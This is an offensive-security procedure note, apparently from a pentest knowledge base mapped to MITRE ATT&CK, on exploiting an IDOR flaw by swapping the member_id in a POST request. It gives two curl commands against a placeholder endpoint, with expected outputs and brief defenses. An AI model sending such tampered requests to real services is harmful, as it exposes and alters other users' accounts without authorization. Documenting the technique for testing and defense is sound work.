---
id: uuid-2
tags:
  - idor
  - parameter-tampering
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-manipulate-member-id]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-05T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:24.287Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manipulate-Member-ID-Parameter-in-Request

## Summary

This procedure tampers with the member_id parameter in a POST request to reference a different user's account, exploiting IDOR to bypass authorization and access unauthorized data or functions.

## Description

Once the vulnerable endpoint is identified, attackers alter the member_id to a victim's value, often numeric or predictable. This targets web apps lacking ownership checks, allowing actions like data retrieval or modification on behalf of others. Prerequisites include a known victim ID, and outcomes enable escalation to account control.

## Requirements

1. Identified vulnerable endpoint from prior reconnaissance
2. Victim's member_id (e.g., via enumeration or guesswork)
3. Authenticated session for request submission

## Defense

Defensive measures and detection strategies:

- Enforce user-context validation (e.g., ensure member_id matches session user)
- Rate-limit and log parameter changes for anomaly detection
- Use session-bound tokens for object access

## Objectives

1. Alter member_id to target victim account
2. Confirm unauthorized access without rejection
3. Set up for account modification actions

## Instructions

### Step 1: Intercept and Modify Request

**Context**: Capture the legitimate POST request and replace member_id with the victim's ID using a proxy tool.

**Command** ([[commands/curl-manipulate-member-id]]):
```bash
curl -X POST 'https://target.com/█████████' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"member_id": "VICTIM_ID"}'
```

> Expected output: Server accepts the request and returns victim-specific data (e.g., {"user_data": {...}}), confirming IDOR.

### Step 2: Validate Tampering Success

**Context**: Send the modified request and check for access to victim resources without authentication errors.

**Command** ([[commands/curl-manipulate-member-id]]):
```bash
curl -v -X POST 'https://target.com/█████████' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"member_id": "VICTIM_ID", "action": "view"}'
```

> Look for 200 OK and victim data in response; errors like 403 would indicate failed bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-manipulate-member-id]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[idor]]
- [[bypass]]
